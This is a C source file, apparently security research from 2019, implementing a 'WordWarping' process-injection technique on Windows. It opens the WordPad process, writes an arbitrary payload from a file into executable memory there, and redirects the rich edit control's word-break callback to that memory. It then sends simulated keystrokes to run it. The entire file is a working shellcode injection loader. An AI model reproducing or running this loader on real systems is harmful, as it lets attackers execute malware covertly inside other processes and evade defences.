/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE

#include <Windows.h>
#include <richedit.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;

    // 1. open the file
    hf=CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

    if(hf!=INVALID_HANDLE_VALUE){
      // get file size
      len=GetFileSize(hf, 0);
      // allocate memory
      *pic=malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID wordwarping(LPVOID payload, DWORD payloadSize) {
    HANDLE        hp;
    DWORD         id;
    HWND          wpw, rew;
    LPVOID        cs, wwf, ptr;
    SIZE_T        rd, wr;
    INPUT         ip;
    
    // 1. Get main window for wordpad.
    //    This will accepted simulated keyboard input.
    wpw = FindWindow(L"WordPadClass", NULL);
    
    // 2. Find the rich edit control for wordpad.
    rew = FindWindowEx(wpw, NULL, L"RICHEDIT50W", NULL);
    
    // 3. Try get current address of Wordwrap function
    wwf = (LPVOID)SendMessage(rew, EM_GETWORDBREAKPROC, 0, 0);

    // 4. Obtain the process id for wordpad.
    GetWindowThreadProcessId(rew, &id);

    // 5. Try open the process.
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, id);

    // 6. Allocate RWX memory for the payload.
    cs = VirtualAllocEx(hp, NULL, payloadSize,
        MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // 7. Write the payload to memory
    WriteProcessMemory(hp, cs, payload, payloadSize, &wr);

    // 8. Update the callback procedure
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)cs);

    // 9. Simulate keyboard input to trigger payload
    ip.type           = INPUT_KEYBOARD;
    ip.ki.wVk         = 'A';
    ip.ki.wScan       = 0;
    ip.ki.dwFlags     = 0;
    ip.ki.time        = 0;
    ip.ki.dwExtraInfo = 0;
    
    SetForegroundWindow(wpw);
    SendInput(1, &ip, sizeof(ip));
    SendInput(1, &ip, sizeof(ip));
    
    // 10. Restore original Wordwrap function
    SendMessage(rew, EM_SETWORDBREAKPROC, 0, (LPARAM)wwf);
    
    // 12. Free memory and close process handle
    VirtualFreeEx(hp, cs, 0,  MEM_RELEASE);
    CloseHandle(hp);
}

int main(void){
    LPVOID pic;
    DWORD  len;
    int    argc;
    PWCHAR *argv;

    argv=CommandLineToArgvW(GetCommandLine(), &argc);

    if(argc!=2){printf("usage: wordwarping <payload>\n");return 0;}

    len=readpic(argv[1], &pic);
    if (len==0) { printf("invalid payload\n"); return 0;}

    wordwarping(pic, len);
    return 0;
}
